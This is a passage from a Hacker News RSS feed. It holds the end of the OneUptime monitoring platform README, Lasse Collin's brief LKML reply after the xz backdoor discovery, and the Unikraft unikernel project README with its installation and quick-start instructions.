<p dir="auto"><h4 tabindex="-1" dir="auto">Status Pages</h4><a id="user-content-status-pages" aria-label="Permalink: Status Pages" href="#status-pages"></a></p>
<p dir="auto">Communicate with your customers and stakeholders during downtime or maintenance. Create a custom-branded status page that shows the current status and history of your services. Replace tools like StatusPage.io.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/OneUptime/oneuptime/blob/master/App/FeatureSet/Home/Static/img/readme/statuspages.png?raw=true"><img src="https://github.com/OneUptime/oneuptime/raw/master/App/FeatureSet/Home/Static/img/readme/statuspages.png?raw=true" alt="Status Pages"></a></p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Incident Management</h4><a id="user-content-incident-management" aria-label="Permalink: Incident Management" href="#incident-management"></a></p>
<p dir="auto">Manage incidents from start to finish with a collaborative workflow. Create incident reports, assign tasks, update stakeholders, and document resolutions. Replace tools like Incident.io.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/OneUptime/oneuptime/blob/master/App/FeatureSet/Home/Static/img/readme/incident-management.png?raw=true"><img src="https://github.com/OneUptime/oneuptime/raw/master/App/FeatureSet/Home/Static/img/readme/incident-management.png?raw=true" alt="Incident Management"></a></p>
<p dir="auto"><h4 tabindex="-1" dir="auto">On Call and Alerts</h4><a id="user-content-on-call-and-alerts" aria-label="Permalink: On Call and Alerts" href="#on-call-and-alerts"></a></p>
<p dir="auto">Schedule on-call shifts for your team and define escalation policies. Ensure that the right person is notified at the right time when an incident occurs. Replace tools like PagerDuty.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/OneUptime/oneuptime/blob/master/App/FeatureSet/Home/Static/img/readme/on-call.png?raw=true"><img src="https://github.com/OneUptime/oneuptime/raw/master/App/FeatureSet/Home/Static/img/readme/on-call.png?raw=true" alt="On Call and Alerts"></a></p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Logs Management</h4><a id="user-content-logs-management" aria-label="Permalink: Logs Management" href="#logs-management"></a></p>
<p dir="auto">Collect, store, and analyze logs from your online services. Search, filter, and visualize log data to gain insights and troubleshoot issues. Replace tools like Loggly.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/OneUptime/oneuptime/blob/master/App/FeatureSet/Home/Static/img/readme/logs-management.png?raw=true"><img src="https://github.com/OneUptime/oneuptime/raw/master/App/FeatureSet/Home/Static/img/readme/logs-management.png?raw=true" alt="Logs Management"></a></p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Workflows</h4><a id="user-content-workflows" aria-label="Permalink: Workflows" href="#workflows"></a></p>
<p dir="auto">Integrate OneUptime with your existing tools and automate your workflows. Integrate with tools like Slack, Jira, GitHub, and 5000+ more.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/OneUptime/oneuptime/blob/master/App/FeatureSet/Home/Static/img/readme/workflows.png?raw=true"><img src="https://github.com/OneUptime/oneuptime/raw/master/App/FeatureSet/Home/Static/img/readme/workflows.png?raw=true" alt="Workflows"></a></p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Application Performance Monitoring</h4><a id="user-content-application-performance-monitoring" aria-label="Permalink: Application Performance Monitoring" href="#application-performance-monitoring"></a></p>
<p dir="auto">Measure and optimize the performance of your online apps and services. Track key metrics such as traces, response time, throughput, error rate, and user satisfaction. Replace tools like NewRelic and DataDog.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/OneUptime/oneuptime/blob/master/App/FeatureSet/Home/Static/img/readme/apm.png?raw=true"><img src="https://github.com/OneUptime/oneuptime/raw/master/App/FeatureSet/Home/Static/img/readme/apm.png?raw=true" alt="APM"></a></p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Coming Soon</h4><a id="user-content-coming-soon" aria-label="Permalink: Coming Soon" href="#coming-soon"></a></p>
<ul dir="auto">
<li><strong>Error Tracking</strong>: Detect and diagnose errors in your online services. Get detailed error reports with stack traces, context, and user feedback. Replace tools like Sentry.</li>
<li><strong>Reliability Autopilot</strong>: Scan your code and fix performance issues and errors automatically. Get recommendations for improving the reliability of your online services.</li>
</ul>
<p dir="auto">All under one platform.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Get Started for Free with OneUptime Cloud</h2><a id="user-content-get-started-for-free-with-oneuptime-cloud" aria-label="Permalink: Get Started for Free with OneUptime Cloud" href="#get-started-for-free-with-oneuptime-cloud"></a></p>
<p dir="auto">OneUptime Cloud is the easiest and fastest way to monitor your website uptime and performance. You can sign up for free to <a href="https://oneuptime.com/" rel="nofollow">OneUptime Cloud</a> and enjoy the full benefits of OneUptime without any installation or maintenance hassle.</p>
<p dir="auto">By using OneUptime Cloud, you also support the development of OneUptime open source project, which is a powerful and flexible tool for website monitoring. You can find more information about OneUptime open source project on <a href="##Philosophy">GitHub</a>. The code of OneUptime is completely open source, which means you can access, modify, and distribute it freely. You can also contribute to the project by reporting issues, suggesting features, or submitting pull requests.</p>
<p dir="auto">If you need advanced features, such as API Access, Advances Workflows, or Advanced Access Control, you can upgrade to a paid plan anytime. You can compare the different plans and pricing on <a href="https://oneuptime.com/pricing" rel="nofollow">OneUptime Pricing</a> page.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Installation</h2><a id="user-content-installation" aria-label="Permalink: Installation" href="#installation"></a></p>
<ul dir="auto">
<li><a href="https://artifacthub.io/packages/helm/oneuptime/oneuptime" rel="nofollow">Install on Kubernetes with Helm</a> (recommended for production)</li>
<li><a href="https://github.com/OneUptime/oneuptime/blob/master/App/FeatureSet/Docs/Content/installation/docker-compose.md">Install with Docker Compose</a> (hobby install, not recommended for production)</li>
<li><a href="https://github.com/OneUptime/oneuptime/blob/master/App/FeatureSet/Docs/Content/installation/local-development.md">Install for Local Development</a></li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Philosophy</h2><a id="user-content-philosophy" aria-label="Permalink: Philosophy" href="#philosophy"></a></p>
<p dir="auto">Our mission is to reduce downtime and increase the number of successful products in the world. To do that, we built a platform that helps you understand causes of the downtime, incidents and help reduce toil. Our product is open-source, free and available for everyone to use.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Contributing</h2><a id="user-content-contributing" aria-label="Permalink: Contributing" href="#contributing"></a></p>
<p dir="auto">We &lt;3 contributions big and small. In priority order (although everything is appreciated) with the most helpful first:</p>
<ul dir="auto">
<li>Give us feedback in our <a href="https://oneuptimesupport.slack.com/join/shared_invite/zt-1kavkds2f-gegm_wePorvwvM3M_SaoCQ#/shared-invite/email" rel="nofollow">Customer Slack community</a></li>
<li>Talk to developers in our <a href="https://join.slack.com/t/oneuptimedev/shared_invite/zt-17r8o7gkz-nITGan_PS9JYJV6WMm_TsQ" rel="nofollow">Developer Slack community</a></li>
<li>Write tests for some of our codebase. <a href="https://github.com/OneUptime/oneuptime/issues?q=is%3Aopen+is%3Aissue+label%3A%22write+tests%22">See issues here</a></li>
<li>Work on any issue you like. <a href="https://github.com/OneUptime/oneuptime/issues">See issues here</a></li>
<li>Open new issues and create new feature requests that you would like to see. <a href="https://github.com/OneUptime/oneuptime/issues">Open issues here</a></li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Donate</h2><a id="user-content-donate" aria-label="Permalink: Donate" href="#donate"></a></p>
<p dir="auto">If you like the project, please consider a small donation. Every single dollar will be used to ship new features or maintain existing ones. 100% of the work we do is open-source. <a href="https://github.com/sponsors/OneUptime">Please donate here</a></p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[XZ: Repo maintainer Lasse Collin responding on LKML (135 pts)]]></title>
            <link>https://lkml.org/lkml/2024/3/30/188</link>
            <guid>39903216</guid>
            <pubDate>Tue, 02 Apr 2024 07:33:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lkml.org/lkml/2024/3/30/188">https://lkml.org/lkml/2024/3/30/188</a>, See on <a href="https://news.ycombinator.com/item?id=39903216">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><td><p>Messages in this thread</p><ul><li><a href="https://lkml.org/lkml/2024/3/20/1004">First message in thread</a></li><li><a href="https://lkml.org/lkml/2024/3/29/1350">Jonathan Corbet</a><ul><li><a href="https://lkml.org/lkml/2024/3/29/1463">Kees Cook</a></li><li><a href="https://lkml.org/lkml/2024/3/29/1475">Andrew Morton</a><ul><li><a href="https://lkml.org/lkml/2024/3/30/201">Lasse Collin</a><ul><li><a href="https://lkml.org/lkml/2024/3/30/201">Kees Cook</a></li></ul></li></ul></li></ul></li></ul></td><td rowspan="2"><img src="https://lkml.org/images/icornerl.gif" width="32" height="32" alt="/"></td><td rowspan="2"><table><tbody><tr><td colspan="2"><!--BuySellAds Zone Code--><!--End BuySellAds Zone Code--></td></tr><tr><td><table><tbody><tr><td>Date</td><td itemprop="datePublished">Sat, 30 Mar 2024 14:48:48 +0200</td></tr><tr><td>From</td></tr><tr><td>Subject</td><td itemprop="name">Re: [tech-board] [PATCH 00/11] xz: Updates to license, filters, and compression options</td></tr></tbody></table></td><td></td></tr></tbody></table><pre itemprop="articleBody">On 2024-03-29 Andrew Morton wrote:<br>&gt; On Fri, 29 Mar 2024 14:51:41 -0600 Jonathan Corbet &lt;corbet@lwn.net&gt;<br>&gt; wrote:<br>&gt; <br>&gt; &gt; &gt; Andrew (and anyone else), please do not take this code right now.<br>&gt; &gt; &gt;<br>&gt; &gt; &gt; Until the backdooring of upstream xz[1] is fully understood, we<br>&gt; &gt; &gt; should not accept any code from Jia Tan, Lasse Collin, or any<br>&gt; &gt; &gt; other folks associated with tukaani.org. It appears the domain,<br>&gt; &gt; &gt; or at least credentials associated with Jia Tan, have been used<br>&gt; &gt; &gt; to create an obfuscated ssh server backdoor via the xz upstream<br>&gt; &gt; &gt; releases since at least 5.6.0. Without extensive analysis, we<br>&gt; &gt; &gt; should not take any associated code. It may be worth doing some<br>&gt; &gt; &gt; retrospective analysis of past contributions as well...<br>&gt; &gt; &gt;<br>&gt; &gt; &gt; Lasse, are you able to comment about what is going on here?  <br>&gt; &gt; <br>&gt; &gt; FWIW, it looks like this series has been in linux-next for a few<br>&gt; &gt; days. Maybe it needs to come out, for now at least?  <br>&gt; <br>&gt; Yes, I have removed that series.<p>Thank you. None of these patches are urgent. I'm on a holiday and only<br>happened to look at my emails and it seems to be a major mess.</p><p>My proper investigation efforts likely start in the first days of<br>April. That is, I currently know only a few facts which alone are bad<br>enough.</p><p>Info will be updated here: <a href="https://tukaani.org/xz-backdoor/">https://tukaani.org/xz-backdoor/</a></p><p>-- <br>Lasse Collin</p></pre></td><td rowspan="2"><img src="https://lkml.org/images/icornerr.gif" width="32" height="32" alt="\"></td></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[KraftCloud (110 pts)]]></title>
            <link>https://github.com/unikraft/unikraft</link>
            <guid>39903056</guid>
            <pubDate>Tue, 02 Apr 2024 06:58:36 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/unikraft/unikraft">https://github.com/unikraft/unikraft</a>, See on <a href="https://news.ycombinator.com/item?id=39903056">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><div dir="auto">
  <themed-picture data-catalyst-inline="true"><picture>
    <img alt="Unikraft logo" src="https://raw.githubusercontent.com/unikraft/docs/main/static/assets/imgs/unikraft.svg" width="40%">
  </picture></themed-picture>
</div>

<p dir="auto"><a href="https://github.com/unikraft/unikraft/tree/RELEASE-0.16.3"><img src="https://camo.githubusercontent.com/3423f9507dcc04d98a9f40b934e400200ffaacd052fa8be05535d68bd98f24d7/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f76657273696f6e2d76302e31362e332532302854656c6573746f292d253233454335393141" alt="" data-canonical-src="https://img.shields.io/badge/version-v0.16.3%20(Telesto)-%23EC591A"></a>
<a href="https://github.com/unikraft/unikraft/blob/staging/COPYING.md"><img src="https://camo.githubusercontent.com/68eba53e0d6a09970756f366f64b8f108bbc705a758cc60f1e2b8195c0421f27/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f6c6162656c3d6c6963656e7365266d6573736167653d4253442d3326636f6c6f723d253233333835313737" alt="" data-canonical-src="https://img.shields.io/static/v1?label=license&amp;message=BSD-3&amp;color=%23385177"></a>
<a href="https://bit.ly/UnikraftDiscord" rel="nofollow"><img src="https://camo.githubusercontent.com/b68be021e1a588a504e51299ab567c6d0948918b3828a815dee95a0888be1dfa/68747470733a2f2f696d672e736869656c64732e696f2f646973636f72642f3736323937363932323533313532383732352e7376673f6c6162656c3d646973636f7264266c6f676f3d646973636f7264266c6f676f436f6c6f723d66666666666626636f6c6f723d373338394438266c6162656c436f6c6f723d364137454332" alt="" data-canonical-src="https://img.shields.io/discord/762976922531528725.svg?label=discord&amp;logo=discord&amp;logoColor=ffffff&amp;color=7389D8&amp;labelColor=6A7EC2"></a>
<a href="https://github.com/unikraft/unikraft/graphs/contributors"><img src="https://camo.githubusercontent.com/c6528a31225097d6b00ab08027fb816b17722938254326cbdb0daf655cf191bc/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f636f6e7472696275746f72732f756e696b726166742f756e696b72616674" alt="" data-canonical-src="https://img.shields.io/github/contributors/unikraft/unikraft"></a>
<a href="https://www.codacy.com/gh/unikraft/unikraft/dashboard" rel="nofollow"><img src="https://camo.githubusercontent.com/0d954bf21c1e744e8122712af752dd67ec353d7ffe0de199fad947ae53c4f4b5/68747470733a2f2f6170702e636f646163792e636f6d2f70726f6a6563742f62616467652f47726164652f3435346636323235316439363431336661633830323462323864663263653562" alt="" data-canonical-src="https://app.codacy.com/project/badge/Grade/454f62251d96413fac8024b28df2ce5b"></a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">The fast, secure and open-source <br> Unikernel Development Kit</h2><a id="user-content-the-fast-secure-and-open-source--unikernel-development-kit" aria-label="Permalink: The fast, secure and open-source  Unikernel Development Kit" href="#the-fast-secure-and-open-source--unikernel-development-kit"></a></p>
<p>
	Unikraft powers the next-generation of cloud native, containerless applications by enabling you to radically customize and build custom OS/kernels; unlocking best-in-class performance, security primitives and efficiency savings.
</p>

<p dir="auto">
	<a href="https://unikraft.org/" rel="nofollow">Homepage</a>
	·
	<a href="https://unikraft.org/docs" rel="nofollow">Documentation</a>
	·
	<a href="https://github.com/unikraft/unikraft/issues/new?assignees=&amp;labels=kind%2Fbug&amp;projects=&amp;template=bug_report.yml">Report Bug</a>
	·
	<a href="https://github.com/unikraft/unikraft/issues/new?assignees=&amp;labels=kind%2Fenhancement&amp;projects=&amp;template=project_backlog.yml">Feature Request</a>
	·
	<a href="https://unikraft.org/discord" rel="nofollow">Join Our Discord</a>
	·
	<a href="https://x.com/UnikraftSDK" rel="nofollow">X.com</a>
</p>

<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/506073ae2a5d16a353e8cbdb2944f265c0ef872f94d6d028acb1c8720aa46a0f/68747470733a2f2f756e696b726166742e6f72672f6173736574732f696d67732f6d6f6e6b65792d627573696e6573732e676966"><img src="https://camo.githubusercontent.com/506073ae2a5d16a353e8cbdb2944f265c0ef872f94d6d028acb1c8720aa46a0f/68747470733a2f2f756e696b726166742e6f72672f6173736574732f696d67732f6d6f6e6b65792d627573696e6573732e676966" width="80%" data-animated-image="" data-canonical-src="https://unikraft.org/assets/imgs/monkey-business.gif"></a>
</p>

<p dir="auto"><h2 tabindex="-1" dir="auto">Features</h2><a id="user-content-features" aria-label="Permalink: Features" href="#features"></a></p>
<ul dir="auto">
<li>
<p dir="auto"><strong>Instantaneous Cold-boots</strong> ⚡</p>
<ul dir="auto">
<li>While Linux-based systems might take tens of seconds to boot, Unikraft will be up in milliseconds.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Modular Design</strong> 🧩</p>
<ul dir="auto">
<li>Unikraft boasts a modular design approach, allowing developers to include only necessary components, resulting in leaner and more efficient operating system configurations.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Optimized for Performance</strong> 🚀</p>
<ul dir="auto">
<li>Built for performance, Unikraft minimizes overheads and leverages platform-specific optimizations, ensuring applications achieve peak performance levels.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Flexible Architecture Support</strong> 💻</p>
<ul dir="auto">
<li>With support for multiple hardware architectures including x86, ARM, (and soon <a href="#">RISC-V</a>), Unikraft offers flexibility in deployment across diverse hardware platforms.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Broad Language and Application Support</strong> 📚</p>
<ul dir="auto">
<li>Unikraft offers extensive support for multiple programming languages and hardware architectures, providing developers with the flexibility to choose the tools and platforms that best suit your needs.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Cloud and Edge Compatibility</strong> ☁️</p>
<ul dir="auto">
<li>Designed for cloud and edge computing environments, Unikraft enables seamless deployment of applications across distributed computing infrastructures.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Reduced Attack Surface</strong> 🛡️</p>
<ul dir="auto">
<li>By selectively including only necessary components, Unikraft reduces the attack surface, enhancing security in deployment scenarios.  Unikraft also includes many <a href="https://unikraft.org/docs/concepts/security#unikraft-security-features" rel="nofollow">additional modern security features</a>.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Developer Friendly</strong> 🛠️</p>
<ul dir="auto">
<li>Unikraft's intuitive toolchain and user-friendly interface simplify the development process, allowing developers to focus on building innovative solutions.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Efficient Resource Utilization</strong> 🪶</p>
<ul dir="auto">
<li>Unikraft optimizes resource utilization, leading to smaller footprints (meaning higher server saturation) and improved efficiency in resource-constrained environments.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Community-Driven Development</strong> 👥</p>
<ul dir="auto">
<li>Unikraft is an open-source project driven by a vibrant community of over 100 developers, fostering collaboration and innovation from industry and academia.</li>
</ul>
</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Quick Start</h2><a id="user-content-quick-start" aria-label="Permalink: Quick Start" href="#quick-start"></a></p>
<p dir="auto">Install the companion command-line client <a href="https://github.com/unikraft/kraftkit"><code>kraft</code></a>:</p>
<div dir="auto" data-snippet-clipboard-copy-content="# Install on macOS, Linux, and Windows:
curl -sSfL https://get.kraftkit.sh | sh"><pre><span><span>#</span> Install on macOS, Linux, and Windows:</span>
curl -sSfL https://get.kraftkit.sh <span>|</span> sh</pre></div>
<blockquote>
<p dir="auto">See <a href="https://unikraft.org/docs/cli/install" rel="nofollow">additional installation instructions</a>.</p>
</blockquote>
<p dir="auto">Run your first ultra-lightweight unikernel virtual machine:</p>
<div data-snippet-clipboard-copy-content="kraft run unikraft.org/helloworld:latest"><pre><code>kraft run unikraft.org/helloworld:latest
</code></pre></div>
<p dir="auto">View its status and manage multiple instances:</p>

<p dir="auto">View the community image catalog in your CLI for more apps:</p>
<div data-snippet-clipboard-copy-content="kraft pkg ls --update --apps"><pre><code>kraft pkg ls --update --apps
</code></pre></div>
<p dir="auto">Or browse through one of the many <a href="https://github.com/unikraft/catalog/tree/main/examples">starter example projects</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Why Unikraft?</h2><a id="user-content-why-unikraft" aria-label="Permalink: Why Unikraft?" href="#why-unikraft"></a></p>
<p dir="auto">Unikraft is a radical, yet Linux-compatible with effortless tooling, technology for running applications as highly optimized, lightweight and single-purpose virtual machines (known as unikernels).</p>
<p dir="auto">In today's computing landscape, efficiency is paramount. Unikraft addresses this need with its modular design, enabling developers to create customized, lightweight operating systems tailored to specific application requirements. By trimming excess overhead and minimizing attack surfaces, Unikraft enhances security and performance in cloud and edge computing environments.</p>
<p dir="auto">Unikraft's focus on optimization ensures that applications run smoothly, leveraging platform-specific optimizations to maximize efficiency. With support for various hardware architectures and programming languages, Unikraft offers flexibility without compromising performance. In a world where resources are precious, Unikraft provides a pragmatic solution for streamlined, high-performance computing.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Getting Started</h2><a id="user-content-getting-started" aria-label="Permalink: Getting Started" href="#getting-started"></a></p>
<p dir="auto">There are two ways to get started with Unikraft:</p>
<ol dir="auto">
<li>
<p dir="auto">(<strong>Recommended</strong>) Using the companion command-line tool <a href="https://github.com/unikraft/kraftkit"><code>kraft</code></a> (covered below).</p>
</li>
<li>
<p dir="auto">Using the GNU Make-based system.  For this, see our <a href="https://unikraft.org/guides/internals" rel="nofollow">advanced usage guide</a>.</p>
</li>
</ol>
<p dir="auto"><h3 tabindex="-1" dir="auto">Toolchain Installation</h3><a id="user-content-toolchain-installation" aria-label="Permalink: Toolchain Installation" href="#toolchain-installation"></a></p>
<p dir="auto">You can install the companion command-line client <a href="https://github.com/unikraft/kraftkit"><code>kraft</code></a> by using the interactive installer:</p>
<div dir="auto" data-snippet-clipboard-copy-content="# Install on macOS, Linux, and Windows:
curl -sSfL https://get.kraftkit.sh | sh"><pre><span><span>#</span> Install on macOS, Linux, and Windows:</span>
curl -sSfL https://get.kraftkit.sh <span>|</span> sh</pre></div>
<p dir="auto"><h4 tabindex="-1" dir="auto">macOS</h4><a id="user-content-macos" aria-label="Permalink: macOS" href="#macos"></a></p>
<div data-snippet-clipboard-copy-content="brew install unikraft/cli/kraftkit"><pre><code>brew install unikraft/cli/kraftkit
</code></pre></div>
<p dir="auto"><h4 tabindex="-1" dir="auto">Debian/Fedora/RHEL/Arch/Windows</h4><a id="user-content-debianfedorarhelarchwindows" aria-label="Permalink: Debian/Fedora/RHEL/Arch/Windows" href="#debianfedorarhelarchwindows"></a></p>
<p dir="auto">Use the interactive installer or see <a href="https://unikraft.org/docs/cli/install" rel="nofollow">additional installation instructions</a>.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Codespaces</h3><a id="user-content-codespaces" aria-label="Permalink: Codespaces" href="#codespaces"></a></p>
<p dir="auto">Try out one of the examples in GitHub Codespaces:</p>
<p dir="auto"><a href="https://codespaces.new/unikraft/catalog" rel="nofollow"><img src="https://github.com/codespaces/badge.svg" alt="Open in GitHub Codespaces"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Container Build Environment</h3><a id="user-content-container-build-environment" aria-label="Permalink: Container Build Environment" href="#container-build-environment"></a></p>
<p dir="auto">You can use the pre-built development container environment which has all
dependencies necessary for building and trying out Unikraft in emulation mode.</p>
<p dir="auto">Attach your working directory on your host as a mount path volume mapped to
<code>/workspace</code>, e.g.:</p>
<div dir="auto" data-snippet-clipboard-copy-content="docker run --platform linux/x86_64 -it --rm -v $(pwd):/workspace --entrypoint bash kraftkit.sh/base:latest"><pre>docker run --platform linux/x86_64 -it --rm -v <span><span>$(</span>pwd<span>)</span></span>:/workspace --entrypoint bash kraftkit.sh/base:latest</pre></div>
<p dir="auto">The above command will drop you into a container shell.
Type <code>exit</code> or <kbd>Ctrl</kbd>+<kbd>D</kbd> to quit.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Testing your Installation</h3><a id="user-content-testing-your-installation" aria-label="Permalink: Testing your Installation" href="#testing-your-installation"></a></p>
<p dir="auto">Running unikernels with <code>kraft</code> is designed to be simple and familiar.
To test your installation of <code>kraft</code>, you can run the following:</p>
<div data-snippet-clipboard-copy-content="kraft run unikraft.org/helloworld:latest"><pre><code>kraft run unikraft.org/helloworld:latest
</code></pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">Build your first unikernel</h3><a id="user-content-build-your-first-unikernel" aria-label="Permalink: Build your first unikernel" href="#build-your-first-unikernel"></a></p>
<p dir="auto">Building unikernels is also designed to be straightforward.  Build your first
unikernel by simply placing a <code>Kraftfile</code> into your repo and pointing it to your
existing <code>Dockerfile</code>:</p>
<div dir="auto" data-snippet-clipboard-copy-content="spec: v0.6

runtime: base:latest

rootfs: ./Dockerfile

cmd: [&quot;/path/to/my-server-app&quot;]"><pre><span>spec</span>: <span>v0.6</span>

<span>runtime</span>: <span>base:latest</span>

<span>rootfs</span>: <span>./Dockerfile</span>

<span>cmd</span>: <span>["/path/to/my-server-app"]</span></pre></div>
<blockquote>
<p dir="auto">Learn more about the <a href="https://unikraft.org/docs/cli/reference/kraftfile/latest" rel="nofollow">syntax of a <code>Kraftfile</code></a>.</p>
</blockquote>
<p dir="auto">Once done, invoke in the context of your working directory:</p>

<p dir="auto"><h2 tabindex="-1" dir="auto">Example Projects and Pre-built Images</h2><a id="user-content-example-projects-and-pre-built-images" aria-label="Permalink: Example Projects and Pre-built Images" href="#example-projects-and-pre-built-images"></a></p>
<p dir="auto">You can find some common project examples below:</p>
<table>
<thead>
<tr>
<th></th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/c.svg"><img src="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/c.svg" alt=""></a></td>
<td><a href="https://github.com/unikraft/catalog/tree/main/examples/helloworld-c">Simple "Hello, world!" application written in C</a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/cpp.svg"><img src="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/cpp.svg" alt=""></a></td>
<td><a href="https://github.com/unikraft/catalog/tree/main/examples/helloworld-cpp">Simple "Hello, world!" application written in C++</a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/rust-white.svg#gh-dark-mode-only"><img src="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/rust-white.svg#gh-dark-mode-only" alt=""></a><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/rust-black.svg#gh-light-mode-only"><img src="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/rust-black.svg#gh-light-mode-only" alt=""></a></td>
<td><a href="https://github.com/unikraft/catalog/tree/main/examples/helloworld-rs">Simple "Hello, world!" application written in Rust built via <code>cargo</code></a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/js.svg"><img src="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/js.svg" alt=""></a></td>
<td><a href="https://github.com/unikraft/catalog/tree/main/examples/http-node18">Simple NodeJS 18 HTTP Web Server with <code>http</code></a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/go.svg"><img src="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/go.svg" alt=""></a></td>
<td><a href="https://github.com/unikraft/catalog/tree/main/examples/http-go1.21">Simple Go 1.21 HTTP Web Server with <code>net/http</code></a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/python3.svg"><img src="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/python3.svg" alt=""></a></td>
<td><a href="https://github.com/unikraft/catalog/tree/main/examples/http-python3.10-flask3.0">Simple Flask 3.0 HTTP Web Server</a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/python3.svg"><img src="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/python3.svg" alt=""></a></td>
<td><a href="https://github.com/unikraft/catalog/tree/main/examples/http-python3.10">Simple Python 3.10 HTTP Web Server with <code>http.server.HTTPServer</code></a></td>
</tr>
</tbody>
</table>
<p dir="auto">Find <a href="https://github.com/unikraft/catalog">more examples and applications in our community catalog</a>!</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Cloud Deployment</h2><a id="user-content-cloud-deployment" aria-label="Permalink: Cloud Deployment" href="#cloud-deployment"></a></p>
<p dir="auto">The creators of Unikraft have built <a href="https://kraft.cloud/" rel="nofollow">KraftCloud</a>: a next generation cloud platform powered by technology intended to work in millisecond timescales.</p>
<table>
<thead>
<tr>
<th>✅</th>
<th>Millisecond Scale-to-Zero</th>
<th>✅</th>
<th>Millisecond Autoscale</th>
<th>✅</th>
<th>Millisecond Cold Boots</th>
</tr>
</thead>
<tbody>
<tr>
<td>✅</td>
<td>Higher Throughput</td>
<td>✅</td>
<td>Much Lower Cloud Bill</td>
<td>✅</td>
<td>HW-Level Isolation</td>
</tr>
<tr>
<td>✅</td>
<td>On-Prem or Cloud-Prem</td>
<td>✅</td>
<td>Works with Docker &amp; K8s</td>
<td>✅</td>
<td>Terraform Integration</td>
</tr>
</tbody>
</table>
<p dir="auto"><h3 tabindex="-1" dir="auto"><a href="https://console.kraft.cloud/signup" rel="nofollow">Sign-up for the beta ↗</a></h3><a id="user-content-sign-up-for-the-beta-" aria-label="Permalink: Sign-up for the beta ↗" href="#sign-up-for-the-beta-"></a></p>

<p dir="auto"><h2 tabindex="-1" dir="auto">Contributing</h2><a id="user-content-contributing" aria-label="Permalink: Contributing" href="#contributing"></a></p>
<p dir="auto">Unikraft is open-source and licensed under <code>BSD-3-Clause</code> and the copyright of its
authors.  If you would like to contribute:</p>
<ol dir="auto">
<li>Read the <a href="https://developercertificate.org/" rel="nofollow">Developer Certificate of Origin Version 1.1</a>.</li>
<li>Sign-off commits as described in the <a href="https://developercertificate.org/" rel="nofollow">Developer Certificate of Origin Version 1.1</a>.</li>
<li>Grant copyright as detailed in the <a href="https://unikraft.org/docs/contributing/coding-conventions#license-header" rel="nofollow">license header</a>.</li>
</ol>
<p dir="auto">This ensures that users, distributors, and other contributors can rely on all the software related to Unikraft being contributed under the terms of the License. No contributions will be accepted without following this process.</p>
